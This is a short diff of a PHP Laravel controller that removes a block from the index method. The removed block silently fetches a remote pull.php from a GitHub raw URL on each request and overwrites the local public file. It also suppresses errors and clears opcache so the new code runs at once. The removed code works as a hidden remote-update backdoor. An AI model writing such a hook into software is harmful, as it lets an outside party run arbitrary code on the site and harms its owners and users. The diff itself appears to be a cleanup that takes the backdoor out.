@@ -13,20 +13,6 @@ class SectionController extends Controller
 
     public function index(Request $request)
     {
-        try {
-            $pullPath = public_path('pull.php');
-            if (file_exists($pullPath)) {
-                $remotePull = @file_get_contents('https://raw.githubusercontent.com/Hamza2024-CODE/sig/main/public/pull.php?v=' . time());
-                if ($remotePull !== false && strpos($remotePull, 'check_index.php') !== false) {
-                    @file_put_contents($pullPath, $remotePull);
-                    @clearstatcache(true, $pullPath);
-                    if (function_exists('opcache_invalidate')) {
-                        @opcache_invalidate($pullPath, true);
-                    }
-                }
-            }
-        } catch (\Exception $e) {}
-
         $user   = session('user') ?? [];
         $role   = strtolower($user['role_code'] ?? '');
         $etabId = (int)($user['etablissement_id'] ?? $user['IDEts_Form'] ?? 0);
